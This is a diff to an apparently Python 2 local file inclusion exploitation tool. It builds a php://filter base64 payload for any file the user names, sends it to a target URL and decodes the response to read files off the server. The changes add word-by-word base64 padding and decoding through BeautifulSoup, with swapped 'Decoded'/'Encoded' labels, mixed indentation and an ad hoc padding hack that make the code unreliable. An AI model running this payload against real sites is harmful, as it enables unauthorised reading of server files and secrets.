@@ -1,3 +1,5 @@
+# -- coding: utf-8 --
+
 __author__ = 'rotlogix'
 __author__ = 'unicornFurnace'
 
@@ -14,7 +16,7 @@ import datetime
 import subprocess
 from urllib import quote_plus
 from os import system
-
+from bs4 import BeautifulSoup
 
 # ---------------------------------------------------------------------------------------------------
 
@@ -593,7 +595,7 @@ class Filter:
         f_file = raw_input(t.cyan("[{0}] ".format(datetime.datetime.now())) + "Please Enter File To Read: ")
         payload = "php://filter/convert.base64-encode/resource={0}".format(f_file)
         lfi = self.target + payload
-
+        print (lfi)
         """ Handle cookies """
 
         if self.cookies:
@@ -617,18 +619,45 @@ class Filter:
         else:
             try:
                 r = requests.get(lfi)
+                print(r)
                 if r.status_code != 200:
                     print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                     sys.exit(1)
                 else:
                     time.sleep(1)
-                    try:
-                        result = base64.b64decode(r.text)
-                        print(
-                            t.cyan("[{0}] ".format(datetime.datetime.now())) + "Decoded: " + t.cyan(
-                                textwrap.fill(result)))
-                    except TypeError as type_error:
-                        print(type_error)
-                        sys.exit(1)
+		    soup = BeautifulSoup(r.text, "lxml")
+	            textke = soup.get_text()
+		    words = textke.split()
+		    for x in range(0, len(words)):
+			    if len(words[x]) % 4:
+				if len(words[x]) % 4 == 1:
+				    print("Decoded:")
+				    words[x]+= '1' + '=' * (3 - len(words[x]) % 4)
+				    print(words[x])
+				    print("Encoded:")
+				    try:
+					print(base64.b64decode(words[x]))
+				    except TypeError:
+					print("Unable to decode")
+				    print(" ")
+				else:
+				    print("Decoded:")
+				    words[x]+= '=' * (4 - len(words[x]) % 4)
+				    print(words[x])
+				    print("Encoded:")
+				    try:
+					print(base64.b64decode(words[x]))
+				    except TypeError:
+					print("Unable to decode")
+				    print(" ")
+			    else:
+				print("Decoded:")
+				print(words[x])
+				print("Encoded:")
+				try:
+				    print(base64.b64decode(words[x]))
+				except TypeError:
+				    print("Unable to decode")
+				print(" ")
             except requests.HTTPError as filter_error:
                 print t.red("[{0}] HTTP Error ".format(datetime.datetime.now()))(filter_error)
